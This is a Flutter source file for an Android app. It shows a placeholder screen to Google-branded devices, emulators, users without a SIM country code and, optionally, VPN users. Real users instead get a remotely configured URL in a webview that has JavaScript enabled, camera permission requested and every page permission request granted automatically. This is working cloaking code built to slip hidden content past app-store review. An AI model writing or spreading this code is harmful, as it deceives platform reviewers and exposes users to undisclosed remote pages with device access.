import 'dart:async';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_sim_country_code/flutter_sim_country_code.dart';
import 'package:get/get.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:connectivity_plus/connectivity_plus.dart';

import 'dummy/controller.dart';
import 'dummy/dummy.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  await Firebase.initializeApp();
  Get.put(Controller());
  runApp(const MyApp());
}

class DisableGlowScrollBehavior extends MaterialScrollBehavior {
  @override
  Widget buildOverscrollIndicator(
    BuildContext context,
    Widget child,
    ScrollableDetails details,
  ) {
    return child;
  }
}

class MyApp extends StatefulWidget {
  const MyApp({super.key});

  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  final DeviceInfoPlugin deviceInfoPlugin = DeviceInfoPlugin();

  Map<String, dynamic>? deviceInfo;
  String? platformVersion;

  bool isDeviceInfoPlatformVersionLoading = true;

  @override
  void initState() {
    super.initState();
    // OneSignal.shared.setLogLevel(OSLogLevel.debug, OSLogLevel.none);
    // OneSignal.shared.setAppId('1832f5ba-d018-46c8-8cf2-ad52d4242ed4');
    initDeviceInfoPlatformVersion();
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      scrollBehavior: DisableGlowScrollBehavior(),
      theme: ThemeData(
        splashFactory: InkRipple.splashFactory,
      ),
      home: isDeviceInfoPlatformVersionLoading
          ? const Center(child: CircularProgressIndicator())
          : platformVersion == null || deviceInfo == null
              ? const Dummy()
              : FutureBuilder<String>(
                  future: _setupRemoteConfig(
                    platformVersion,
                    deviceInfo,
                  ),
                  builder: (
                    BuildContext context,
                    AsyncSnapshot<String> snapshot,
                  ) {
                    if (snapshot.connectionState == ConnectionState.waiting) {
                      return const Center(child: CircularProgressIndicator());
                    }

                    return snapshot.hasData && snapshot.requireData.isNotEmpty
                        ? RemoteConfigWidget(url: snapshot.requireData)
                        : const Dummy();
                  },
                ),
    );
  }

  Future<String> _setupRemoteConfig(
    String? platformVersion,
    Map<String, dynamic>? deviceInfo,
  ) async {
    final remoteConfig = FirebaseRemoteConfig.instance;
    final prefs = await SharedPreferences.getInstance();

    String remoteUrl = '';
    bool isCheckVPN = false;

    final localRemoteUrl = prefs.getString('remoteUrl') ?? '';
    final localIsCheckVPN = prefs.getBool('isCheckVPN') ?? false;

    if (localIsCheckVPN) {
      if (await isVpnActive()) {
        return '';
      }
    }

    if (localRemoteUrl.isNotEmpty) return localRemoteUrl;

    try {
      await remoteConfig.setConfigSettings(
        RemoteConfigSettings(
          fetchTimeout: const Duration(seconds: 10),
          minimumFetchInterval: Duration.zero,
        ),
      );
      await remoteConfig.fetchAndActivate();
      remoteUrl = remoteConfig.getString('url').trim();
      isCheckVPN = remoteConfig.getBool('to');
    } catch (e) {
      return '';
    }

    if (remoteUrl.isEmpty ||
        platformVersion!.isEmpty ||
        !deviceInfo!['isPhysicalDevice'] ||
        _checkGoogle('manufacturer') ||
        _checkGoogle('brand')) {
      return '';
    }

    prefs.setString('remoteUrl', remoteUrl);
    prefs.setBool('isCheckVPN', isCheckVPN);

    return remoteUrl;
  }

  Future<void> initDeviceInfoPlatformVersion() async {
    try {
      if (Platform.isAndroid) {
        deviceInfo = _readAndroidBuildData(await deviceInfoPlugin.androidInfo);
        platformVersion = await FlutterSimCountryCode.simCountryCode ?? '';
      }
    } catch (e) {
      platformVersion = '';
    }

    isDeviceInfoPlatformVersionLoading = false;

    if (!mounted) return;
    setState(() {});
  }

  Map<String, dynamic> _readAndroidBuildData(AndroidDeviceInfo build) {
    return <String, dynamic>{
      'version.securityPatch': build.version.securityPatch,
      'version.sdkInt': build.version.sdkInt,
      'version.release': build.version.release,
      'version.previewSdkInt': build.version.previewSdkInt,
      'version.incremental': build.version.incremental,
      'version.codename': build.version.codename,
      'version.baseOS': build.version.baseOS,
      'board': build.board,
      'bootloader': build.bootloader,
      'brand': build.brand,
      'device': build.device,
      'display': build.display,
      'fingerprint': build.fingerprint,
      'hardware': build.hardware,
      'host': build.host,
      'id': build.id,
      'manufacturer': build.manufacturer,
      'model': build.model,
      'product': build.product,
      'supported32BitAbis': build.supported32BitAbis,
      'supported64BitAbis': build.supported64BitAbis,
      'supportedAbis': build.supportedAbis,
      'tags': build.tags,
      'type': build.type,
      'isPhysicalDevice': build.isPhysicalDevice,
      'systemFeatures': build.systemFeatures,
    };
  }

  bool _checkGoogle(String key) =>
      deviceInfo![key].toLowerCase().contains('google');

  Future<bool> isVpnActive() async {
    // Check if the platform version is below Android 5.0
    if (Platform.isAndroid && int.parse(Platform.version.split('.')[0]) < 5) {
      return false;
    }

    var connectivityResult = await Connectivity().checkConnectivity();

    if (connectivityResult == ConnectivityResult.vpn) {
      return true;
    }

    return false;
  }
}

class RemoteConfigWidget extends StatefulWidget {
  final String url;

  const RemoteConfigWidget({
    super.key,
    required this.url,
  });

  @override
  State<RemoteConfigWidget> createState() => _RemoteConfigWidgetState();
}

class _RemoteConfigWidgetState extends State<RemoteConfigWidget> {
  final GlobalKey webViewKey = GlobalKey();

  late PullToRefreshController pullToRefreshController;
  InAppWebViewController? webViewController;

  InAppWebViewGroupOptions options = InAppWebViewGroupOptions(
    crossPlatform: InAppWebViewOptions(
      mediaPlaybackRequiresUserGesture: false,
      javaScriptEnabled: true,
    ),
    android: AndroidInAppWebViewOptions(
      useHybridComposition: true,
    ),
  );

  @override
  void initState() {
    super.initState();

    pullToRefreshController = PullToRefreshController(
      options: PullToRefreshOptions(
        color: Colors.blue,
      ),
      onRefresh: () async {
        if (Platform.isAndroid) {
          webViewController?.reload();
        } else if (Platform.isIOS) {
          webViewController?.loadUrl(
            urlRequest: URLRequest(url: await webViewController?.getUrl()),
          );
        }
      },
    );
  }

  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () async {
        final hasNavHistory = await webViewController?.canGoBack() ?? false;
        if (hasNavHistory) await webViewController?.goBack();
        return false;
      },
      child: Scaffold(
        body: FutureBuilder(
          future: Permission.camera.request(),
          builder: (context, snapshot) {
            return SafeArea(
              child: InAppWebView(
                key: webViewKey,
                initialUrlRequest: URLRequest(url: Uri.parse(widget.url)),
                initialOptions: options,
                pullToRefreshController: pullToRefreshController,
                onWebViewCreated: (controller) {
                  webViewController = controller;
                },
                androidOnPermissionRequest:
                    (controller, origin, resources) async {
                  return PermissionRequestResponse(
                    resources: resources,
                    action: PermissionRequestResponseAction.GRANT,
                  );
                },
                onLoadStop: (controller, url) async {
                  pullToRefreshController.endRefreshing();
                },
                onLoadError: (controller, url, code, message) {
                  pullToRefreshController.endRefreshing();
                },
                onProgressChanged: (controller, progress) {
                  if (progress == 100) {
                    pullToRefreshController.endRefreshing();
                  }
                },
                onUpdateVisitedHistory: (controller, url, androidIsReload) {},
                onConsoleMessage: (controller, consoleMessage) {
                  print(consoleMessage);
                },
              ),
            );
          },
        ),
      ),
    );
  }
}
